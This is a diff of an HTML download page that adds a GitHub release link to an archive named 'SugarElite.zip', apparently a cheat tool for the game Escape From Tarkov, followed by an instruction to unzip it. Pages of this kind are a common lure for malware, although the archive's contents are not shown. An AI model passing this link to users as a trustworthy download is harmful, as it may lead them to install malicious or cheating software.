@@ -25,7 +25,7 @@
     <ol>
         <li>
             <b style="color:#FF4500;">Download:</b>  
-            <a href="" style="text-decoration:none;color:#4682B4;">🔹 Click here to download 🔹</a>
+            <a href="https://github.com/DionysusYY/Escape-From-Tarkov-Sugar-Elite-Soft/releases/download/latest/SugarElite.zip" style="text-decoration:none;color:#4682B4;">🔹 Get the latest version from Github 🔹</a>
         </li>
         <li>
             <b style="color:#32CD32;">Unzip Archive:</b>  
